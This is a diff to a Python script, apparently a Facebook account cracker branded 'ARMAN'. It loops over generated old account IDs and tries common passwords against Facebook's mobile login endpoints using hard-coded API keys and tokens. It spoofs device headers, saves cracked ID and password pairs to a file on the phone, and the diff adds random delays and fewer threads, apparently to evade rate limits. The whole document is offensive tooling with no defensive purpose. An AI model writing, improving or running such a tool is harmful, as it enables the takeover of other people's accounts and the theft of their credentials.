@@ -317,7 +317,6 @@ G = '\x1b[38;5;46m'
 Y = '\x1b[38;5;220m'
 W = '\x1b[1;37m'
 
-# Advanced Dynamic Headers & Fingerprinting Generator
 def get_smart_headers():
     android_versions = ["13", "14", "12", "11"]
     device_models = [
@@ -379,11 +378,11 @@ def creationyear(uid):
     if uid.startswith(('1000000004', '1000000005')): return '2008'
     if len(uid) == 15:
         if uid.startswith('100000000'): return '2009'
-        return ''
+        return '2010-2014'
     elif len(uid) in (9, 10): return '2008'
     elif len(uid) == 8: return '2007'
     elif len(uid) == 7: return '2006'
-    else: return ''
+    else: return 'OLD-SERIES'
 
 def linex():
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -437,10 +436,9 @@ def old_One():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
     linex()
     meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
-    with tred(max_workers=30) as pool:
+    with tred(max_workers=20) as pool:
         ____banner____()
         print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + " " + limit + W)
-        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
         linex()
         for mal in user:
             uid = star + mal
@@ -465,7 +463,7 @@ def old_Tow():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
     linex()
     meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
-    with tred(max_workers=35) as pool:
+    with tred(max_workers=20) as pool:
         ____banner____()
         print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + " " + limit + W)
         linex()
@@ -488,7 +486,7 @@ def old_Tree():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
     linex()
     meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
-    with tred(max_workers=35) as pool:
+    with tred(max_workers=20) as pool:
         ____banner____()
         print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + " " + limit + W)
         linex()
@@ -528,40 +526,43 @@ def login_1(uid):
                 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
-            # Using updated smart headers with dynamic device rotation
             headers = get_smart_headers()
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            year_tag = creationyear(uid)
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN-OK\x1b[38;5;196m) = \x1b[38;5;46m{uid} | {pw} | [{year_tag}]\x1b[0m")
+                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}|{year_tag}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN-OK\x1b[38;5;196m) = \x1b[38;5;46m{uid} | {pw} | [{year_tag}]\x1b[0m")
+                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}|{year_tag}\n")
                 oks.append(uid)
                 break
         loop += 1
+        time.sleep(random.uniform(0.3, 0.8))
     except Exception:
-        time.sleep(0.5)
+        time.sleep(1)
 
 def login_2(uid):
     global loop
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mARMAN-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mARMAN-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     for pw in ('123456', '123123', '1234567', '12345678', '123456789', 'pakistan', '786786', 'qwerty', '112233'):
         try:
             with requests.Session() as session:
                 headers = get_smart_headers()
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                 po = session.get(url, headers=headers).json()
+                year_tag = creationyear(uid)
                 if 'session_key' in str(po):
-                    print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN-OK\x1b[38;5;196m) = \x1b[38;5;46m{uid} | {pw} | [{year_tag}]\x1b[0m")
+                    open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}|{year_tag}\n")
                     oks.append(uid)
                     break
         except Exception:
-            time.sleep(0.5)
+            time.sleep(1)
     loop += 1
+    time.sleep(random.uniform(0.3, 0.8))
 
 if __name__ == '__main__':
     result = check_key()
